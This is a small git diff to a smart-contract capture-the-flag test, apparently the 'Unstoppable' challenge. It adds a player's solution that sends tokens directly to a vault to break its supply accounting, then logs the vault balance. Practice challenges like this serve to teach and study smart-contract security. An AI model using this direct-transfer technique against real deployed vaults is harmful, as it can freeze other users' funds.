@@ -45,6 +45,11 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        //!Attack and break the vaults initial supply amount...
+       await token.connect(player).transfer(vault.address,INITIAL_PLAYER_TOKEN_BALANCE);
+       const amount =await token.balanceOf(vault.address);
+
+    console.log("Vault token supply::",amount)
     });
 
     after(async function () {
